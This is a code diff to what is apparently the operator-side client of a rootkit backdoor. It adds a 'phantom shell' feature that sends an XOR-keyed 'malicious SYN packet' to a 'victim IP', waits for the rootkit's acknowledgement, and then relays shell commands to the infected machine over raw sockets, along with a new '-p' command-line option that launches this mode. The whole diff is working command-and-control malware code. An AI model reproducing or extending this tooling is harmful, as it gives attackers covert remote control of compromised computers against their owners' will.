@@ -95,6 +95,66 @@ unsigned short crc16(const unsigned char* data_p, unsigned char length){
     return crc;
 }
 
+/**
+ * @brief Operates input in phantom shell mode.
+ * Returns whether the connection should keep open (0) or not (otherwise)
+ * 
+ * @param buf 
+ * @return int 
+ */
+int phantom_shell_mode(char* buf, char* local_ip, char* dest){
+    int is_global_command = manage_global_command(buf, NULL, local_ip, dest);
+	if(is_global_command == 1){
+		//Already finished then, go to next command input
+		return 0;
+	}
+
+	char* request = calloc(4096, sizeof(char));
+	strcpy(request, CC_PROT_BASH_COMMAND_REQUEST);
+	strcat(request, buf);
+    packet_t packet = build_standard_packet(8000, 9000, local_ip, dest, 4096, request);
+    //printf("Sending %s\n", msg);
+    if(rawsocket_send(packet)<0){
+        printf("["KRED"ERROR"RESET"]""An error occured. Aborting...\n");
+        return 1;
+    }
+    printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
+    packet = rawsocket_sniff_pattern(CC_PROT_BASELINE);
+    char* res = packet.payload;
+    //TODO make the shell to fork and wait for response, but accept new requests meanwhile
+    if(strncmp(buf, CC_PROT_BASH_COMMAND_RESPONSE, strlen(CC_PROT_BASH_COMMAND_RESPONSE))==0){
+        //Received a response
+        char *p;
+        p = strtok(buf, "#");
+        p = strtok(NULL, "#");
+        if(p){
+            //Print response
+            printf("%s\n", p);
+        }else{
+            printf("[" KRED "ERROR" RESET "]""Could not parse backdoor answer correctly, ignoring\n");
+        }
+    }else if(strncmp(buf, CC_PROT_ERR, strlen(CC_PROT_ERR))==0){
+		printf("[" KRED "ERROR" RESET "]""Backdoor did not understand the request: %s\n", request);
+	}else{
+		//If at this point, then we failed to identify the backdoor message
+		//We attempt to send a final message indicating we are halting the connection
+		printf("[" KRED "ERROR" RESET "]""Backdoor sent unrecognizable message:\n[%s]\n", buf);
+		printf("[" KBLU "INFO" RESET "]""Shutting down connection now\n");
+		const char *response = CC_PROT_FIN;
+		packet_t packet = build_standard_packet(8000, 9000, local_ip, dest, 4096, request);
+        if(rawsocket_send(packet)<0){
+            printf("["KRED"ERROR"RESET"]""An error occured. Aborting...\n");
+            return 1;
+        }
+		return 1;
+	}
+
+
+    printf("["KGRN"RESPONSE"RESET"] %s\n", res); 
+
+    free(request);  
+    return 0;
+}
 
 /*void get_shell(char* argv){
     char* local_ip = getLocalIpAddress();
@@ -310,6 +370,88 @@ void hook_control_command(char* argv, int mode){
     }
 }
 
+
+void phantom_shell_request(char* argv){
+    char* local_ip = getLocalIpAddress();
+    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
+    check_ip_address_format(argv);
+    printf("["KBLU"INFO"RESET"]""Crafting malicious SYN packet...\n");
+    //+1 since payload must finish with null character for parameter passing, although not sent in the actual packet payload
+    char payload[CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE+1] = {0};
+    srand(time(NULL));
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_PAYLOAD_SIZE; ii++){
+        payload[ii] = (char)rand();
+    }
+    //Follow protocol rules
+    char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
+    char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
+    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_1;
+    char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1] = CC_TRIGGER_SYN_PACKET_KEY_2;
+    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN+1];
+    //K3 with command to start the command with the backdoor
+    memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_PHANTOM_SHELL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+
+    char result[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
+    memcpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
+        result[ii] = section[ii] ^ key1[ii];
+    }
+    memcpy(payload+0x06, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+
+    memcpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
+        result[ii] = section[ii] ^ key2[ii];
+    }
+    memcpy(payload+0x0A, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+
+    memcpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    memcpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
+        result[ii] = section[ii] ^ section2[ii] ^ key3[ii];
+    }
+
+    memcpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
+    
+    packet_t packet = build_standard_packet(8000, 9000, local_ip, argv, 4096, payload);
+    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
+    //Sending the malicious payload
+    if(rawsocket_send(packet)<0){
+        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
+        return;
+    }else{
+        printf("["KGRN"OK"RESET"]""Secret message successfully sent!\n");
+    }
+
+    printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
+
+    //Wait for rootkit ACK to ensure it's up
+    rawsocket_sniff_pattern(CC_PROT_ACK);
+    printf("["KGRN"OK"RESET"]""Success, received ACK from backdoor\n");   
+    
+    client_mode = CLIENT_MODE_PHANTOM_SHELL;
+    //Received ACK, we proceed to send command
+    int connection_terminate = 0;
+    while(connection_terminate == 0){
+        char buf[BUFSIZ];  
+        switch(client_mode){
+			case CLIENT_MODE_LIVE_COMMAND:                                                                                                                                                        
+                printf(">> client["""KMGN"phantom shell"RESET"""]>: ");                                                                                                                                                                
+                fgets(buf, BUFSIZ, stdin);
+                if ((strlen(buf)>0) && (buf[strlen(buf)-1] == '\n')){
+                    buf[strlen(buf)-1] = '\0';
+                }                                                                                                                                                                         
+                
+                connection_terminate = phantom_shell_mode(buf, local_ip, argv);
+                break;
+            default:
+                break;
+        }
+
+    }
+    
+    free(local_ip);
+}
+
 //Rootkit backdoor V3 being used - Hive-like
 void activate_command_control_shell_encrypted_multi_packet(char* argv, int mode){
     char* local_ip = getLocalIpAddress();
@@ -413,7 +555,7 @@ void main(int argc, char* argv[]){
     char path_arg[512];
 
     //Command line argument parsing
-    while ((opt = getopt(argc, argv, ":S:c:e:u:a:s:h")) != -1) {
+    while ((opt = getopt(argc, argv, ":S:c:e:u:a:p:s:h")) != -1) {
         switch (opt) {
         case 'S':
             print_welcome_message();
@@ -467,6 +609,17 @@ void main(int argc, char* argv[]){
             //printf("Option S has argument %s\n", optarg);
             strcpy(dest_address, optarg);
             hook_control_command(dest_address, 1);
+            PARAM_MODULE_ACTIVATED = 1;
+            
+            break;
+        case 'p':
+            print_welcome_message();
+            sleep(1);
+            //Send a secret message
+            printf("["KBLU"INFO"RESET"]""Requested a PHANTOM SHELL\n");
+            //printf("Option S has argument %s\n", optarg);
+            strcpy(dest_address, optarg);
+            phantom_shell_request(dest_address);
             PARAM_MODULE_ACTIVATED = 1;
             
             break;
